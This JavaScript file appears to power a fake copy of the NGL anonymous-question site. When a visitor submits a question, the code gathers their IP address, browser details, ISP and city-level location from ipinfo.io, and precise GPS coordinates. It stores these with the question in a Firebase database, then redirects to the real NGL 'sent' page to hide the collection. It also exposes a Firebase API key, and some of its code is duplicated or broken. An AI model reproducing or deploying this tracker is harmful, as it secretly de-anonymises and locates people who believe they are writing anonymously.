
  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-app.js";
  import { getAnalytics } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-analytics.js";
  import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.11.1/firebase-database.js";

  const firebaseConfig = {
    apiKey: "AIzaSyB9EYm59W4mR9bMdIFO0ip5a36rZ9kJ_ho",
    authDomain: "ngl-data.firebaseapp.com",    
    projectId: "ngl-data",
    storageBucket: "ngl-data.appspot.com",
    messagingSenderId: "701230322711",
    appId: "1:701230322711:web:e5eff8c4a226e89ec8f852",
    measurementId: "G-DQEG89JG1E"
  };


  // Initialize Firebase

  const app = initializeApp(firebaseConfig);
  const analytics = getAnalytics(app);
  const db = getDatabase(app)

  const sub_btn = document.getElementById('submit');
  const question = document.getElementById('question');
  const currentTime = new Date();
  const curr_time = currentTime.toLocaleTimeString();
  const curr_date = currentTime.toDateString();
  
  async function ipaddr() {
      try {
          const res = await fetch('https://api.ipify.org?format=json');
          const data = await res.json();
          const ip = data.ip;
          console.log(ip)
          return ip;
      }
      catch {
          console.error('Error while fetching IP address:', error);
          throw error; // Optionally re-throw the error
      }
  }
  var ip_addr = await ipaddr();
  const ref_pass = ref(db, "NGL-link");
  
  
  //  Send the message first 
  sub_btn.addEventListener('click', function() {
    push(ref_pass, {
        A_IP : ip_addr,
        B_TIME : curr_time,
        C_Date : curr_date,
        D_QUESTION : question.value.trim()
    })
    console.log(question.value.trim());



// Extra info which we want


const userAgent = navigator.userAgent;
const appCodeName = navigator.appCodeName
const appName = navigator.appName
const appVersion = navigator.appVersion
const appbuild = navigator.buildID

push(ref_pass, {
    A_IP : ip_addr,
    B_TIME : curr_time,
    C_Date : curr_date,
    userAgent : userAgent,
    appCodeName : appCodeName,
    appName : appName,
    appVersion : appVersion,
    appbuild : appbuild
})

async function location() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        const ip = data.ip;
        const city = data.city;
      const region = data.region;
      const country = data.country;
      const loc = data.loc;
      const org = data.org;
      const timeZone = data.timezone;
        
      loc_data = {
        A_IP : ip_addr,
        B_TIME : curr_time,
        C_Date : curr_date,
        ip : ip,
        city : city,
        region : region,
        country : country,
        loc : loc,
        org : org,
        timeZone : timeZone
      }
      push(ref_pass, loc_data)
        return loc_data;
    }
    catch {
        console.error('Error while fetching Location: ', error);
        throw error; // Optionally re-throw the error
    }
}

var loc_data = await location();

    


    
});

submitButton.addEventListener("click", function() {

        if ("geolocation" in navigator) {
            // Geolocation is available
            navigator.geolocation.getCurrentPosition(position => {
              const latitude = position.coords.latitude;
              const longitude = position.coords.longitude;
              push(ref_pass, {
                A_IP : ip_addr,
                B_TIME : curr_time,
                C_Date : curr_date,
                D_ACTUAL : "LOCATION",
                latitude: latitude,
                longitude : longitude
            })
              console.log(`Latitude: ${latitude}, Longitude: ${longitude}`);
            }, error => {
              // Handle errors
              console.error('Error getting geolocation:', error);
            });
          } else {
            // Geolocation is not available
            console.error('Geolocation is not supported by this browser.');
          }
        window.location.href = "https://ngl.link/p/sent/confessions?lng=en";
        console.log("window Transfer")




})



// Extra info which we want


const userAgent = navigator.userAgent;
const appCodeName = navigator.appCodeName
const appName = navigator.appName
const appVersion = navigator.appVersion
const appbuild = navigator.buildID

push(ref_pass, {
    A_IP : ip_addr,
    B_TIME : curr_time,
    C_Date : curr_date,
    userAgent : userAgent,
    appCodeName : appCodeName,
    appName : appName,
    appVersion : appVersion,
    appbuild : appbuild
})

async function location() {
    try {
        const res = await fetch('https://ipinfo.io/json');
        const data = await res.json();
        const ip = data.ip;
        const city = data.city;
      const region = data.region;
      const country = data.country;
      const loc = data.loc;
      const org = data.org;
      const timeZone = data.timezone;
        
      loc_data = {
        A_IP : ip_addr,
        B_TIME : curr_time,
        C_Date : curr_date,
        ip : ip,
        city : city,
        region : region,
        country : country,
        loc : loc,
        org : org,
        timeZone : timeZone
      }
      push(ref_pass, loc_data)
        return loc_data;
    }
    catch {
        console.error('Error while fetching Location: ', error);
        throw error; // Optionally re-throw the error
    }
}

var loc_data = await location();






// Final statement
console.log("working 0000");
